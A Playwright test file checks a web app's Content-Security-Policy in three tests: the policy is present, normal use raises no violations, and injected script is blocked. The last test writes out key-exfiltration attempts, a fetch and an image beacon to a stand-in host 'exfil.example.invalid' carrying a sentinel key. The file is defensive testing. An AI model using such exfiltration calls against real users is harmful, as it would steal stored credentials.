// SPDX-License-Identifier: AGPL-3.0-or-later
import { test, expect } from '@playwright/test'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

/**
 * `TODO/ai-004`, `docs/decisions/ai-partner.md` decision 8 — the Content-Security-Policy
 * meta tag, verified **against the running app** in each engine:
 *
 * 1. **The app violates none of it.** Loading a scene (the evaluation worker), exporting an STL
 *    (the export worker and a `blob:` download), opening the File menu and the Assistant key
 *    sheet raises no `securitypolicyviolation` event and no "Content Security Policy" console
 *    error. Gist loading and the PWA service worker are the other parts the decision names as
 *    likely to need an entry: this app has no gist loader yet (grep-checked), and the service
 *    worker is registered only by the production build (checked against `vite preview`; see the
 *    task's retirement note).
 * 2. **The policy is live.** Script injected into the page cannot run inline code, cannot
 *    `fetch` an unlisted host (so it cannot post the stored key anywhere), and cannot beacon the
 *    key out through an image — each attempt raises the matching violation. That is the whole
 *    point of the policy, so it is asserted rather than assumed. No request leaves the browser:
 *    the policy blocks them first.
 *
 * ## Engines and viewports, stated (`CLAUDE.md`)
 *
 * All three engines: CSP enforcement and its violation events are engine-specific (WebKit and
 * Firefox differ on `blob:` workers, `ws:` versus `'self'` and inline styles). Viewport-agnostic
 * (no layout assertion), so it runs in the standard matrix without a snapshot. Firefox may fail
 * to launch in this sandbox (`TROUBLESHOOTING.md`).
 */

const FIXTURE = join(process.cwd(), 'e2e', 'docs', 'fixtures', 'cube-and-cylinder.ndjson')

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => {
    Object.defineProperty(window, 'showSaveFilePicker', { value: undefined, configurable: true })
    Object.defineProperty(window, 'showOpenFilePicker', { value: undefined, configurable: true })
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (event) =>
      window.__cspViolations.push({ directive: event.violatedDirective, blocked: event.blockedURI }),
    )
  })
})

/** @param {import('@playwright/test').Page} page */
const violations = (page) => page.evaluate(() => window.__cspViolations)

test('the policy is present on the page the browser actually loaded', async ({ page }) => {
  await page.goto('/')
  const content = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  expect(content).toContain("connect-src 'self'")
  expect(content).toContain('https://api.anthropic.com')
  expect(content).toContain('https://api.github.com')
  expect(content).not.toMatch(/script-src[^;]*unsafe-inline/)
  // The dev server relaxes exactly two things (vite.config.js); the production build — which
  // `E2E_PREVIEW=1` serves — carries the policy exactly as written in index.html.
  if (process.env.E2E_PREVIEW === '1') expect(content).not.toMatch(/unsafe-eval|ws:/)
  else expect(content).toMatch(/script-src 'self' 'unsafe-eval'/)
})

test('the running app violates nothing: scene load, STL export, File menu and Assistant sheet', async ({ page }) => {
  const consoleErrors = []
  page.on('console', (message) => {
    if (message.type() === 'error' || message.type() === 'warning') consoleErrors.push(message.text())
  })
  page.on('pageerror', (error) => consoleErrors.push(String(error)))
  await page.goto('/')
  const viewport = page.getByTestId('viewport')
  await expect(viewport).toHaveAttribute('data-webgl', 'ready')

  // Scene load: File ▸ Open → the evaluation worker builds both bodies.
  await page.getByTestId('file-menu-button').click()
  const chooserEvent = page.waitForEvent('filechooser')
  await page.getByTestId('file-open').click()
  const chooser = await chooserEvent
  await chooser.setFiles({ name: 'cube-and-cylinder.ndjson', mimeType: 'text/plain', buffer: readFileSync(FIXTURE) })
  await expect(viewport).toHaveAttribute('data-body-count', '2')

  // STL export: the export worker and a blob: download.
  await page.getByTestId('file-menu-button').click()
  await page.getByTestId('file-export').click()
  await expect(page.getByTestId('export-popover')).toBeVisible()
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export-commit').click()])
  expect(download.suggestedFilename()).toMatch(/\.stl$/)

  // The Assistant key sheet, and a stubbed Test against the allowlisted API origin.
  // Routed on the context, not the page: the production build's service worker can issue the
  // request itself, and a page-level route never sees those (the real API answered 401 on WebKit).
  await page.context().route('https://api.anthropic.com/**', async (route) => {
    const headers = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' }
    if (route.request().method() === 'OPTIONS') return route.fulfill({ status: 204, headers })
    return route.fulfill({ status: 200, headers: { ...headers, 'content-type': 'application/json' }, body: '{"input_tokens":8}' })
  })
  await page.getByTestId('assistant-button').click()
  await page.getByTestId('ai-key-input').fill('sk-ant-api03-csp-sentinel-0123456789')
  await page.getByTestId('ai-key-save').click()
  await expect(page.getByTestId('ai-key-status-text')).toContainText('Connected')

  expect(await violations(page)).toEqual([])
  expect(consoleErrors.filter((text) => /content security policy|refused to/i.test(text))).toEqual([])
})

test('the policy is live: inline script, an unlisted host and an image beacon are all blocked', async ({ page }) => {
  await page.goto('/')
  await expect(page.getByTestId('viewport')).toBeVisible()

  const outcome = await page.evaluate(async () => {
    // 1. Inline script injection.
    const script = document.createElement('script')
    script.textContent = 'window.__inlineRan = true'
    document.head.append(script)

    // 2. fetch to a host that is not on the allowlist (the key-exfiltration route).
    let fetchBlocked = false
    try {
      await fetch('https://exfil.example.invalid/steal?k=sentinel')
    } catch {
      fetchBlocked = true
    }

    // 3. The image beacon.
    const image = new Image()
    const imageErrored = new Promise((resolve) => {
      image.onerror = () => resolve(true)
      image.onload = () => resolve(false)
    })
    image.src = 'https://exfil.example.invalid/beacon.png?k=sentinel'
    const beaconBlocked = await Promise.race([imageErrored, new Promise((resolve) => setTimeout(() => resolve(false), 3000))])

    // Let the violation events (queued tasks) flush.
    await new Promise((resolve) => setTimeout(resolve, 100))
    return { inlineRan: window.__inlineRan === true, fetchBlocked, beaconBlocked }
  })

  expect(outcome.inlineRan).toBe(false)
  expect(outcome.fetchBlocked).toBe(true)
  expect(outcome.beaconBlocked).toBe(true)
  const seen = (await violations(page)).map((v) => v.directive.split('-')[0] + '-' + (v.directive.split('-')[1] ?? ''))
  expect(seen.some((d) => d.startsWith('script'))).toBe(true)
  expect(seen.some((d) => d.startsWith('connect'))).toBe(true)
  expect(seen.some((d) => d.startsWith('img'))).toBe(true)
})
